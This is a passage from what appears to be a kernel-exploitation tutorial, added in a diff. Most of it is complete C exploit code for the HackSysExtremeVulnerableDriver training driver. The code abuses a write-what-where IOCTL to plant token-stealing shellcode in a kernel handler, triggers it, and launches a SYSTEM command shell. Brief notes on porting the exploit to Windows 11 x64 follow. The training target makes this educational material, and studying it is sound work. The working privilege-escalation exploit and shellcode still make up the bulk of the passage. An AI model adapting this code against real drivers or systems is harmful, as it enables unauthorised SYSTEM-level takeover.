+</span></span><span style="display:flex;"><span>} SYSTEM_MODULE_ENTRY, <span style="color:#f92672">*</span>PSYSTEM_MODULE_ENTRY;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _SYSTEM_MODULE_INFORMATION
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  ULONG Count;
+</span></span><span style="display:flex;"><span>  SYSTEM_MODULE_ENTRY Module[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>} SYSTEM_MODULE_INFORMATION, <span style="color:#f92672">*</span>PSYSTEM_MODULE_INFORMATION;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* KernelGetModuleBase():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Function used to obtain kernel module address */</span>
+</span></span><span style="display:flex;"><span>PVOID <span style="color:#a6e22e">KernelGetModuleBase</span>(PCHAR pcModuleName)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hModule                                    <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  PVOID pSystemInfo                                 <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  PVOID pModule                                     <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  NTSTATUS status                                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc000009a</span>; <span style="color:#75715e">// STATUS_INSUFFICIENT_RESOURCES
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  SYSTEM_INFORMATION_CLASS SystemModuleInformation  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0B</span>;
+</span></span><span style="display:flex;"><span>  ULONG SystemInfoSize                              <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  hModule <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibraryA</span>(<span style="color:#e6db74">&#34;ntdll.dll&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hModule <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to load ntdll.dll</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ZwQuerySystemInformation <span style="color:#f92672">=</span> (ZWQUERYSYSTEMINFORMATION)<span style="color:#a6e22e">GetProcAddress</span>(hModule, <span style="color:#e6db74">&#34;ZwQuerySystemInformation&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ZwQuerySystemInformation <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to find ZwQuerySystemInformation within ntdll.dll&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hModule);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Obtain the size of the requested information */</span>
+</span></span><span style="display:flex;"><span>  status <span style="color:#f92672">=</span> <span style="color:#a6e22e">ZwQuerySystemInformation</span>(SystemModuleInformation,
+</span></span><span style="display:flex;"><span>                                    NULL,
+</span></span><span style="display:flex;"><span>                                    SystemInfoSize,
+</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&amp;</span>SystemInfoSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (SystemInfoSize <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to get size of SystemInformation</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hModule);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  pSystemInfo <span style="color:#f92672">=</span> (PSYSTEM_MODULE_INFORMATION)<span style="color:#a6e22e">malloc</span>(SystemInfoSize);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (pSystemInfo <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for SystemInformation</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hModule);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(pSystemInfo, <span style="color:#e6db74">&#39;\0&#39;</span>, SystemInfoSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Obtain the SystemModuleInformation */</span>
+</span></span><span style="display:flex;"><span>  status <span style="color:#f92672">=</span> <span style="color:#a6e22e">ZwQuerySystemInformation</span>(SystemModuleInformation,
+</span></span><span style="display:flex;"><span>                                    pSystemInfo,
+</span></span><span style="display:flex;"><span>                                    SystemInfoSize,
+</span></span><span style="display:flex;"><span>                                    <span style="color:#f92672">&amp;</span>SystemInfoSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  PSYSTEM_MODULE_ENTRY pSysModule <span style="color:#f92672">=</span> ((PSYSTEM_MODULE_INFORMATION)(pSystemInfo))<span style="color:#f92672">-&gt;</span>Module;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> ((PSYSTEM_MODULE_INFORMATION)(pSystemInfo))<span style="color:#f92672">-&gt;</span>Count; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pSysModule[i].FullPathName, pcModuleName) <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      pModule <span style="color:#f92672">=</span> pSysModule[i].ImageBase;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hModule <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hModule);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> pModule;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* WriteBytes():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     This function triggers the Write-What-Where vulnerability */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">WriteBytes</span>(HANDLE hHEVD, ULONG ulWhat, ULONG ulWhere)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned;
+</span></span><span style="display:flex;"><span>  WRITE_WHAT_WHERE www <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  www.Where <span style="color:#f92672">=</span> (PULONG)ulWhere;
+</span></span><span style="display:flex;"><span>  www.What <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>ulWhat;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Writing 0x%p to 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>www.What, www.Where);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  HEVD_IOCTL_ARBITRARY_WRITE,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>www,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(WRITE_WHAT_WHERE),
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Arbitrary write */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD i                 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwShellcodeLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  ULONG target            <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  ULONG ulRawBytes        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  PVOID pHEVDBase         <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  CHAR cRawBytes[<span style="color:#ae81ff">60</span>]      <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  CHAR cShellcode[]<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// nops
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle -p windows/x86/kernel_token_stealer -f c -m pinpoint
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60</span><span style="color:#e6db74">&#34;</span>                         <span style="color:#75715e">// pushal 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// xor eax, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x64\x8b\x80\x24\x01\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// mov eax, dword ptr fs:[eax + 0x124]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x40\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov eax, dword ptr [eax + 0x50]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xc1</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// mov ecx, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\x04\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>         <span style="color:#75715e">// mov edx, 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x80\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// mov eax, dword ptr [eax + 0xb8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2d\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>         <span style="color:#75715e">// sub eax, 0xb8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\x90\xb4\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// cmp dword ptr [eax + 0xb4], edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xed</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// jne 0x1014
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x90\xf8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// mov edx, dword ptr [eax + 0xf8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x91\xf8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// mov dword ptr [ecx + 0xf8], edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61</span><span style="color:#e6db74">&#34;</span>                         <span style="color:#75715e">// popal
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* return code (sickle -a x86 -m asm_shell) */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// xor eax, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc2\x08\x00</span><span style="color:#e6db74">&#34;</span>;                <span style="color:#75715e">// ret 0x8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  dwShellcodeLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">60</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((dwShellcodeLength <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Shellcode must by divisible by 4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  pHEVDBase <span style="color:#f92672">=</span> <span style="color:#a6e22e">KernelGetModuleBase</span>(<span style="color:#e6db74">&#34;HEVD&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (pHEVDBase <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Obtained HEVD base address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHEVDBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  target <span style="color:#f92672">=</span> (ULONG)pHEVDBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x448f2</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* This is a quick for loop I whipped up to write our shellcode. The way this works is the buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     is converted into a little endian ASCII address (e.g 0x41424344 -&gt; 0x44434241) then we convert
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     the ASCII address to an unsigned long integer (4 bytes) to be written via the Write-What-Where
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     vulnerability. Each iteration we increment the target address by 4 (32bit address) to point to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     the next address, we also increment the pointer to the shellcode array by 4 (we can only write
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     4 bytes at a time). */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwShellcodeLength; i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sprintf</span>(cRawBytes, <span style="color:#e6db74">&#34;0x%02x%02x%02x%02x&#34;</span>, ((<span style="color:#66d9ef">uint32_t</span>)cShellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                             ((<span style="color:#66d9ef">uint32_t</span>)cShellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                             ((<span style="color:#66d9ef">uint32_t</span>)cShellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                             ((<span style="color:#66d9ef">uint32_t</span>)cShellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ulRawBytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(cRawBytes, NULL, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WriteBytes</span>(hHEVD, ulRawBytes, target);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(cRawBytes, <span style="color:#e6db74">&#39;\0&#39;</span>, <span style="color:#ae81ff">60</span>);
+</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Calling DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Exploitation successful, enjoy your shell!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Successful exploitation shown below :)</p>
+<p><img src="/0x04-Introduction-To-Windows-Kernel-Write-What-Where/win7www.gif" alt="alt text"></p>
+<p>Great work exploiting a Write-What-Where vulnerability! As a challenge to you, before reading the next section go ahead and attempt exploitation against any version of Windows 11 (x64).</p>
+<p>If you manage to get code execution, ask yourself what are the main changes? Are there any? Even if you don&rsquo;t get it before the next section, I&rsquo;m sure you will walk away with a valuable set of skills to further enhance your approach during exploitation :)</p>
+<h1 id="windows-11-x64">Windows 11 (x64)</h1>
+<p>Having completed this challenge rather quickly in Windows 7 (x86), let&rsquo;s try exploitation in Windows 11 (x64).</p>
+<h2 id="reverse-engineering">Reverse Engineering</h2>
+<p>Looking at the vulnerable function in Ghidra it&rsquo;s easy to spot the arbitrary write using the pseudo code.</p>
+<p><img src="/0x04-Introduction-To-Windows-Kernel-Write-What-Where/decompiled_function.png" alt="alt text"></p>
+<p>The next thing we need to do is identify what the members are of the <code>_WRITE_WHAT_WHERE</code> structure, in this case it&rsquo;s easy to identify since we see the members being accessed are being stored in unsigned long pointers. However, since we have symbols, we can easily locate this just to be sure in the <code>Data Type Manager</code>.</p>
+<p><img src="/0x04-Introduction-To-Windows-Kernel-Write-What-Where/DataManage.png" alt="alt text"></p>
+<p>Knowing this information we can start to generate a PoC to interact with this function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
